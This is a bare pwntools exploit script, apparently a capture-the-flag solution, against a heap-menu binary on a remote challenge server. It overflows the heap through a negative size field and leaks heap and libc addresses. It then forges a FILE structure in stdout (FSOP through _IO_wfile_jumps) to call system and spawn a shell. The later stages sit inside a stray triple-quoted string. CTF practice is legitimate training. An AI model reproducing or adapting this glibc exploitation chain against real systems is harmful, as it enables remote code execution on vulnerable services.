#!/usr/bin/env python3

from pwn import *

exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def setfile(data):
	sla(b"> ", b"1")
	sla(b"cpio: ", data)

def editfile(name, size, data):
	sla(b"> ", b"3")
	sla(b"edit: ", name)
	sla(b"size: ", f"{size}".encode())
	sa(b"data: ", data)

def view():
	sla(b"> ", b"2")

script = '''
# printf
brva 0x18AC 
'''
context.log_level = "debug"
# p = remote("0", 31313)
p = remote("nc.deadsec.quest", 32345)
# p = process('./prob_patched')
#p = gdb.debug('./prob_patched', gdbscript = script)

payload = b"c771" # flag
payload += b"0700" * (0x1a//2 - 1) # padding size name and size data
payload += b"41" * (0x40 // 2) # data and name (idk wtf is this)
setfile(payload)

payload = b"c771"
payload += b"0700" * (0x1a//2 - 1)
payload += b"42" * (0x40 // 2)
setfile(payload)

# leak heap
editfile(b"A" * 7, -1, b"A" * 0x2770 + p8(0x90))
# view()
p.interactive()
'''
p.recvn(0x4b)
s = p.recvn(6)
heap_base = u64(s.ljust(8, b"\x00")) - 0x4c90
lleak("heap", heap_base)

# leak libc
editfile(b"A" * 7, -1, b"A" * 0x2770 + p64(heap_base + 0x408))
view()
p.recvn(0x4b)
s = p.recvn(6)
libc_base = u64(s.ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stderr_']
lleak("libc", libc_base)

# make note[1]'s data ptr point to stdout
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
editfile(b"A" * 7, -1, b"A" * 0x2770 + p64(heap_base + 0x4cc0) + p64(_IO_2_1_stdout_))

# fsop
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

editfile(b"B" * 7, -1, payload)

p.interactive()
'''